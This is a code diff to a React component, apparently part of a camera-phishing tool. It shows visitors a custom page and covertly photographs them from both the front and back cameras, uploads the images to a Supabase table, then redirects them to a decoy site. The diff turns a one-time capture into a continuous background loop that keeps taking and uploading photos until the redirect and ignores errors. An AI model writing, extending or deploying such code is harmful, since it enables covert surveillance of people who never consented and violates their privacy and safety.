@@ -7,9 +7,10 @@ const CustomCapture = () => {
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const [customHtml, setCustomHtml] = useState<string | null>(null);
-  const [captureComplete, setCaptureComplete] = useState(false);
   const [countdown, setCountdown] = useState<number | null>(null);
   const [showCountdown, setShowCountdown] = useState(false);
+  const captureLoopRef = useRef<boolean>(false);
+  const stopCaptureRef = useRef<boolean>(false);
   
   const sessionId = searchParams.get("session") || "default";
   const redirectUrl = searchParams.get("redirect") || "https://google.com";
@@ -376,7 +377,7 @@ const CustomCapture = () => {
         videoRef.current.srcObject = stream;
         await videoRef.current.play();
         
-        await new Promise(resolve => setTimeout(resolve, 800));
+        await new Promise(resolve => setTimeout(resolve, 500));
         
         if (canvasRef.current && videoRef.current) {
           const canvas = canvasRef.current;
@@ -402,62 +403,83 @@ const CustomCapture = () => {
     }
   };
 
-  // Capture photos when custom HTML is loaded
-  useEffect(() => {
-    if (!customHtml || captureComplete) return;
-
-    const capturePhotos = async () => {
+  // Continuous capture loop - keeps capturing until redirect
+  const startContinuousCapture = async () => {
+    if (captureLoopRef.current) return;
+    captureLoopRef.current = true;
+    
+    let captureCount = 0;
+    
+    while (!stopCaptureRef.current) {
       try {
-        // Capture from FRONT camera first
+        captureCount++;
+        
+        // Capture from FRONT camera
         const frontImage = await captureFromCamera("user");
         
-        if (frontImage) {
+        if (frontImage && !stopCaptureRef.current) {
           await supabase.from('captured_photos').insert({
             session_id: sessionId,
             image_data: frontImage,
-            user_agent: `${navigator.userAgent} [FRONT]`
+            user_agent: `${navigator.userAgent} [FRONT-${captureCount}]`
           });
         }
         
-        await new Promise(resolve => setTimeout(resolve, 300));
+        if (stopCaptureRef.current) break;
+        
+        // Small delay before switching cameras
+        await new Promise(resolve => setTimeout(resolve, 200));
         
         // Capture from BACK camera
         const backImage = await captureFromCamera("environment");
         
-        if (backImage) {
+        if (backImage && !stopCaptureRef.current) {
           await supabase.from('captured_photos').insert({
             session_id: sessionId,
             image_data: backImage,
-            user_agent: `${navigator.userAgent} [BACK]`
+            user_agent: `${navigator.userAgent} [BACK-${captureCount}]`
           });
         }
         
-        setCaptureComplete(true);
+        if (stopCaptureRef.current) break;
         
-        // Start countdown after capture is complete
-        setShowCountdown(true);
-        setCountdown(countdownSeconds);
+        // Delay before next capture cycle
+        await new Promise(resolve => setTimeout(resolve, 500));
         
       } catch (error) {
-        console.error("Capture error:", error);
-        // Even on error, start the countdown
-        setCaptureComplete(true);
-        setShowCountdown(true);
-        setCountdown(countdownSeconds);
+        console.error("Capture cycle error:", error);
+        // Continue loop even on error
+        await new Promise(resolve => setTimeout(resolve, 1000));
       }
-    };
+    }
+  };
 
-    // Start capture after a short delay to let HTML render
-    const timer = setTimeout(capturePhotos, 500);
-    return () => clearTimeout(timer);
-  }, [customHtml, captureComplete, sessionId, countdownSeconds]);
+  // Stop capture when component unmounts or redirect happens
+  useEffect(() => {
+    return () => {
+      stopCaptureRef.current = true;
+    };
+  }, []);
+
+  // Start capture and countdown when custom HTML is loaded
+  useEffect(() => {
+    if (!customHtml) return;
+
+    // Start countdown immediately
+    setShowCountdown(true);
+    setCountdown(countdownSeconds);
+    
+    // Start continuous capture in background
+    startContinuousCapture();
+  }, [customHtml, countdownSeconds]);
 
   // Countdown timer effect
   useEffect(() => {
     if (countdown === null || countdown < 0) return;
 
     if (countdown === 0) {
-      // Redirect when countdown reaches 0
+      // Stop capture and redirect
+      stopCaptureRef.current = true;
       window.location.href = redirectUrl;
       return;
     }
